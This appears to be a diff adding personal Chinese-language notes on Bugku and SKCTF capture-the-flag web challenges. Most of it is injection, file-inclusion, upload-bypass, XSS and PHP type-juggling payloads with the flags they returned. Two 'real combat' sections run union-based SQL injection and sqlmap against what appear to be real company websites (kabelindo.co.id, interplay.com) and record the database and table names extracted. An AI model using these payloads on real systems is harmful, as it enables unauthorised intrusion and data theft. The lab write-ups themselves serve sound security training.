@@ -1,0 +1,343 @@
+web
+https://www.cnblogs.com/zhengjim/p/6972527.html
+https://www.jianshu.com/p/6750db0943b7
+https://blog.csdn.net/qq_35078631/article/details/69488266
+https://findneo.github.io/180406BugkuWriteup/
+
+杂项：https://blog.csdn.net/krdecad3/article/details/80635713
+
+1.web2
+打开是一堆滑稽的动态图片，直接F12审查元素。
+get flag
+
+0x02.文件上传测试
+上传PHP文件才能得到flag，但是只允许上传图片。 
+方法一：可以先上传图片文件，利用burp抓包，更改文件扩展名为php，即可得到flag。 
+方法二：%00截断，先上传图片文件，利用burp抓包，在文件名后面添加“%00.php”，发送，得到flag。
+
+SQL注入1
+id=1 un<>ion se<>lect 1,database()%23  sql3  
+id=1 un<>ion se<>lect hash,2 fr<>om sql3.key%23
+c3d3c17b4ca7f791f85e#$1cc72af274af4adef
+id=1 un<>ion se<>lect 1,group_concat(id,0x23,hash) fr<>om sql3.key%23
+1#c3d3c17b4ca7f791f85e#$1cc72af274af4adef
+
+0x03.计算器
+右键查看元素，发现表单输入有限制输入长度，双击修改maxlength再提交计算结果就得到flag
+
+0x04.web基础$_GET
+通过get方法传入参数使“what”的值等于flag。 
+payload:?what=flag
+
+矛盾
+观察题目，应该是使用is_numeric遇到%00截断的漏洞,这里构造
+
+http://120.24.86.145:8002/get/index1.php?num=1%00
+flag{bugku-789-ps-ssdf}
+
+web3
+禁止弹窗后，查看源码，发现<script>注释里有一串unicode编码，解码即得到flag
+&#75;&#69;&#89;&#123;&#74;&#50;&#115;&#97;&#52;&#50;&#97;&#104;&#74;&#75;&#45;&#72;&#83;&#49;&#49;&#73;&#73;&#73;&#125;
+KEY{J2sa42ahJK-HS11III}
+
+web基础$_POST： what=flag
+这个简单的POST 我们可以直接利用firefox里面的hackbar附件
+
+INSERT INTO注入
+$sql="insert into client_ip (ip) values ('$ip')";
+
+
+报错注入
+load_file()：导出文件 
+load_file(file_name):读取文件并返回该文件的内容作为一个字符串, file_name不能是一个已经存在的文件。
+hex(replace(load_file(char(99,58,92,119,105,110))) 数字：c:/boot.ini"的ASCII代码
+select load_file('c:\\wamp\\bin\\mysql\\mysql5.6.17\\my.ini')into outfile 'c:\\wamp\\www\\test.php'
+?id=1%0band%0bupdatexml(1,concat(0x23,database()),1)%23
+sql4
+?id=1%0band%0bupdatexml(1,concat(hex(replace(0x23,load_file(char(47,118,97,114,47,116,101,115,116,47,107,101,121,95,49,46,112,104,112)))),1)%23
+
+?id=1%0band%0bupdatexml(1,concat(0x23,hex(load_file(0x2F7661722F746573742F6B65795F312E706870))),1)%23
+3C3F706870206664736166617366647  ?php fdsafasfd
+?id=1%0band%0bupdatexml(1,concat(0x23,substr(load_file(0x2F7661722F746573742F6B65795F312E706870),86,100)),1)%23
+Flag:”7249f5a7fd1de602b30e6f39aea6193a”
+?id=1%0band%0bupdatexml(1,concat(0x23,substr(load_file(0x2F7661722F746573742F6B65795F312E706870),100,120)),1)%23
+7249f5a7fd1de602b30e6f39aea61    fd1de602b30e6f39aea6193a"fsdafs'
+
+实战2-注入  数字型 http://www.kabelindo.co.id/readnews.php?id=24
+http://120.24.86.145:8007/web2/flag
+sqlmap.py -u "http://www.kabelindo.co.id/readnews.php?id=24" --dbs
+-u "http://www.kabelindo.co.id/readnews.php?id=24" --table -D " u9897uwx_kabel"
+
+24 and updatexml(1,concat(0x23,(select group_concat(table_name) from information_schema.tables where table_schema='u9897uwx_kabel')),1)%23
+counter,csr,lowongan,mstdkb,mstdsg,mstpro,news,opsod,opsoh,pencarian,tabcus,tabgrp,tabmenu,tbnomax
+24 and updatexml(1,concat(0x23,substr((select table_name from information_schema.tables where table_schema='u9897uwx_kabel'limit 21,1),1,20),0x23),1)%23
+substr((select table_name from information_schema.tables where table_schema='cheaa' limit 0,1),1,1)
+
+24 and updatexml(1,concat(0x23,substr((select group_concat(table_name) from information_schema.tables where table_schema='u9897uwx_kabel'),1,31)),1)%23
+
+实战1-注入  数字型
+http://www.interplay.com/?id=1
+id=1' and 1=1 %23
+id=1' order by 11%23
+http://www.interplay.com/games/support.php?id=374
+id=374 order by 19%23
+id=374 and 1=2 union select 1,2,3,4,5,6,7,8,9,0,1,2,3,4,5,6,7,8,9%23
+id=374 and 1=2 union select 1,2,3,4,5,6,7,8,9,0,1,2,3,4,5,6,database(),8,9%23
+interplay
+id=374 and 1=2 union select 1,2,3,4,5,6,7,8,9,0,1,2,3,4,5,6,group_concat(table_name,0x23),8,9 from information_schema.tables where table_schema=0x696E746572706C6179%23
+
+这 是 一 个 神 奇 的 登 录 界 面 
+输入账号：aaa 密码：1" or 1=1#
+输入账号：aaa 密码：aaa" and updatexml(1,concat(0x23,database()),1)#
+bugkusql1
+输入账号：aaa 密码：aaa" and updatexml(1,concat(0x23,(select group_concat(table_name) from information_schema.tables where table_schema='bugkusql1'),0x23),1)#
+#flag1,whoami#
+输入账号：aaa 密码：aaa" and updatexml(1,concat(0x23,(select group_concat(column_name) from information_schema.columns where table_schema='bugkusql1' and table_name='flag1')),1)#
+flag1
+输入账号：aaa 密码：aaa" and updatexml(1,concat(0x23,(select group_concat(flag1)from bugkusql1.flag1)),1)#
+#ed6b28e684817d9efcaf802979e57aea'      
+输入账号：aaa 密码：aaa" and updatexml(1,concat(0x23,substr((select group_concat(flag1)from bugkusql1.flag1),20,50)),1)#
+ed6b28e684817d9efcaf  4817d9efcaf802979e57aea  f802979e57aea
+
+远程文件包含shell
+http://10.250.25.162/FI/PHP_FI.php?filename=http://127.0.0.1/lele.txt
+http://127.0.0.1/FI/PHP_FI.php?filename=http://10.250.25.162/123.txt  自己攻击自己
+
+文件包含2
+http://118.89.219.210:49166/index.php?file=upload.php
+file upload successful!Save in: upload/201808080130051008.jpg
+cmd=system('ls');
+http://118.89.219.210:49166/index.php?file=this_is_th3_F14g_154f65sd4g35f4d6f43.txt
+SKCTF{uP104D_1nclud3_426fh8_is_Fun} 
+
+你必须让他停下
+reload() 方法用于重新加载当前文档。
+setTimeout() 方法用于在指定的毫秒数后调用函数或计算表达式。
+Burp抓包，发送到Repeater，然后不停的“go”，直到在Response中看到flag。
+
+XSS
+http://103.238.227.13:10089/?id=\u003cimg src=1 onerror=alert(_key_)\u003e
+http://103.238.227.13:10089/?id=\u003cimg%20src=1%20onclick=alert(_key_)\u003e
+\u003cBODY onload=alert(_key_)\u003e
+
+变量1
+http://120.24.86.145:8004/index1.php?args=GLOBALS
+
+头等舱
+各个地方都没有找到什么，那么根据题目提示，猜测http头可能有什么。 
+抓包，send to Repeater在响应头里发现flag。 
+
+
+网站被黑  密码  hack
+直接用 御剑
+http://120.24.86.145:8002/webshell/shell.php
+发现后台登陆界面  
+ burp   暴力抓取
+
+用burp密码字典 passwords
+
+web4
+eval(unescape(p1) + unescape('%35%34%61%61%32' + p2))
+
+p1=function checkSubmit(){var a=document.getElementById("password");if("undefined"!=typeof a){if("67d709b2b
+
+
+
+p2=aa648cf6e87a7114f1"==a.value)return!0;alert("Error");a.focus();return!1}}document.getElementById
+
+%35%34%61%61%32=54aa2
+
+提交67d709b2b54aa2aa648cf6e87a7114f1
+
+得到flag
+
+flag在index里
+
+flag在index里
+
+将网页点开，在点击相应连接，网页地址栏变为:
+
+http://120.24.86.145:8005/post/index.php?file=show.php
+
+
+看到了file关键字，
+看看用php://filter能否将index读出来
+
+
+http://120.24.86.145:8005/post/index.php?file=php://filter/read/convert.base64-encode/resource=index.php
+
+
+将得到了base64解码， 观察程序得到flag
+
+
+
+输入密码查看flag  密码：13479
+burp暴力破解
+
+点击一百万次
+hackbar  post请求：clicks=1000000
+
+备份是个好习惯
+http://120.24.86.145:8002/web16/index.php.bak
+过滤了key，需要重写绕过
+http://120.24.86.145:8002/web16/?kekeyy1=240610708&kkeyey2=QNKCDZO 
+函数 
+strstr(str1, str2)判断str2是否是str1的子串； 
+substr(str, start[,length])返回字符串的一部分； 
+str_replace()以其他字符替换字符串中的一些字符（区分大小写）。 
+同时有md5验证相等，且key1不等于key2。 
+双写变量名，构造数组或弱类型绕过。 
+payload: 
+?kekeyy1[]=1&kekeyy2[]=2 
+?kekeyy1=240610708&kekeyy2=QNKCDZO
+
+成绩单
+POST里 
+id=1'和id=1'# 
+id=1' and 1=2#和id=1' and 1=1# 
+前一个不回显后一个回显，那么说明存在注入。 
+判断字段数：有四个字段 
+id=1' order by 4# 
+判断回显位： 
+id=1' union select 1,2,3,4# 
+查数据库：出现skctf_flag 
+id=0' union select 1,2,3,database()# 
+查数据表：出现fl4g, sc 
+id=0' union select 1,2,3,group_concat(table_name) from information_schema.tables where table_schema='skctf_flag'# 
+查fl4g字段：得到记录名skctf_flag 
+id=0' union select 1,2,3,group_concat(column_name) from information_schema.columns where table_name='fl4g'# 
+查询数据： 
+id=0' union select 1,2,3,skctf_flag from fl4g# 
+
+过狗一句话
+http://120.24.86.145:8010/?s=print_r(glob("*")) Array([0] =>f94lag.txt[1] =>index.php[2] =>shell.php[3]=>stream.php[4] => xx.php ) 
+print_r(file(f94lag.txt))  没出来
+http://120.24.86.145:8010/?s=show_source(f94lag.txt)
+
+hackbar   http://120.24.86.145:8010/f94lag.txt   直接访问
+
+字符？正则？
+最最关键的还是看preg_match中的内容嘛，这里简单讲一下、需要用到的规则
+
+1.表达式直接写出来的字符串直接利用，如key
+2.“.”代表任意字符
+3.“*”代表一个或一序列字符重复出现的次数，即前一个字符重复任意次
+4.“\/”代表“/”
+5.[a-z]代表a-z中的任意一个字符
+6.[[:punct:]]代表任意一个字符，包括各种符号
+7./i代表大小写不敏感
+8.{4-7}代表[0-9]中数字连续出现的次数是4-7次
+然后我们自己按照规则胡乱构造一下就可以了
+
+http://120.24.86.145:8002/web10/?id=keyssssskey4567key:/s/ssssskeya@
+
+前女友(SKCTF)      
+1.进入后发现是这个.....  出题人辛苦了  我们查看网站源代码发现连接这个词就是个链接   于是我们点击链接一词 
+ 可以看到网站源代码  
+<?php
+if(isset($_GET['v1']) && isset($_GET['v2']) && isset($_GET['v3'])){
+    $v1 = $_GET['v1'];
+    $v2 = $_GET['v2'];
+    $v3 = $_GET['v3'];
+    if($v1 != $v2 && md5($v1) == md5($v2)){
+        if(!strcmp($v3, $flag)){
+            echo $flag;
+        }
+    }
+}
+?>
+简单的看下就明白是php中md5()函数漏洞和strcmp()函数漏洞的利用
+所以简单构造下数组就可以了
+http://47.93.190.246:49162/?v1[]=1&v2[]=2&v3[]=1
+2.查看源代码：点击code.txt
+利用经典的md5 弱类型匹配和strcmp的数组get漏洞，当strcmp（数组，字符串）==0，然后我们构造payload如下
+http://47.93.190.246:49162/?v1=QNKCDZO&v2=240610708&v3[]=0
+得到SKCTF{Php_1s_tH3_B3St_L4NgUag3}
+
+login1(SKCTF)
+约束攻击的原理就是注册用户名为'admin   '（有多个空格，这里是三个）的账号，密码'ABCabc123'（密码可以自定义），然后登陆成功，
+但是数据库会返回表中的第一个用户，也就是真真实实的admin（这个漏洞只可能在老版本的sql中出现，新版本的mysql已经修复漏洞）,
+然后就可以用admin的身份登陆网页，拿到flag。
+
+域名解析
+访问120.24.86.145 并burp抓包，修改host值为flag.bugku.com 即可。KEY{DSAHDSJ82HDS2211}
+
+你从哪里来
+1.Cookie这行上加这句:Referer:https://www.google.com
+2.抓包，然后修改或添加referer字段的值Referer:https://www.google.com
+3.得到flag{bug-ku_ai_admin}
+
+md5 collision(NUPT_CTF)
+在php文件中，以MD5值以0e开头的话，php就会认为他们两个的值相等  。所以可以写个脚本来跑出一个以0e开头的
+然后直接在网站上找了以0e开头的字符串：  http://www.219.me/posts/2884.html      然后直接选其中一个提交拿到flag
+http://120.24.86.145:9009/md5.php?a=s878926199a
+
+各种绕过哟
+对于md5和sha1加密来说，它们的数组都返回null  null=null   为true
+根据源代码 GET 一个unname 和POST一个 passwd 值不能相等 sha1要相等 ，提交数组。Sha1()均返回null 绕过
+http://120.24.86.145:8002/web7/?uname[]=&id=margin
+post passwd[]=1
+Flag: flag{HACK_45hhs_213sDD}
+
+Web8
+extract 可以将$_GET数组的值转为变量，默认是如果有冲突，则覆盖已有的变量。
+File_get_contents() 利用php://input绕过。
+http://120.24.86.145:8002/web8/?ac=a&fn=php://input
+post a
+
+求getshell
+php别名：php2, php3, php4, php5, phps, pht, phtm, phtml 均试下。
+发现php5绕过
+参考大佬的思路，先把上面的Content-Type: multipart/form-data; 改成大小写绕过的形式，
+改为Content-Type: Multipart/form-data;，然后再一个一个地尝试，发现php5可以利用 
+
+细心
+不知道是个啥，反正先用dirsearch扫描一下来着，发现目录 
+然后查看 robots.txt 
+http://120.24.86.145:8002/web13/robots.txt 
+然后按照提示做了一下，想办法变成admin…构造x=admin…结果… 
+http://120.24.86.145:8002/web13/resusl.php?x=admin
+
+cookie欺骗
+http://120.24.86.145:8002/web11/index.php?line=&filename=a2V5cy50eHQ=
+http://120.24.86.145:8002/web11/index.php?line=0%d&filename=a2V5cy5waHA=
+a2V5cy50eHQ=   keys.txt
+a2V5cy5waHA=   keys.php
+Connection: close这句前加入cookie： Cookie:margin=margin
+<?php $key='KEY{key_keys}'; ?>
+
+web5
+在f12控制台中运行([][(![]+[])[+[]]+...+([][[]]+[])[!+[]+!+[]])
+加回车键
+ctf{whatfk}
+CTF{WHATFK}
+
+flag.php
+http://120.24.86.145:8002/flagphp/?hint=0
+利用burp抓包后加上Cookie值即可
+Cookie: ISecer=s:0:"";
+
+Trim的日记本
+访问show.php
+
+
+
+输入账号：aaa 密码：1') or 1=1#
+
+KYsd3js2
+E{a2jda}
+
+
+这是一张单纯的图片
+1.打开题目所给的链接，发现是一张图片，应该是考察隐写术。右击保存图片到本地
+2.将打开方式设为记事本，查看了下文件头部和文件尾部，在文件尾部发现Unicode编码(&#107;&#101;&#121;&#123;
+   &#121;&#111;&#117;&#32;&#97;&#114;&#101;&#32;&#114;&#105;&#103;&#104;&#116;&#125)，复制
+3.解码得key{you are right}
+
+这不是MD5
+复制，16进制在线转换成字符串得到flag{ae73587ba56baef5}
+
+解码大全http://ctf.ssleye.com/
+贝斯家族
+base91解码得到flag{554a5058c9021c76}
+
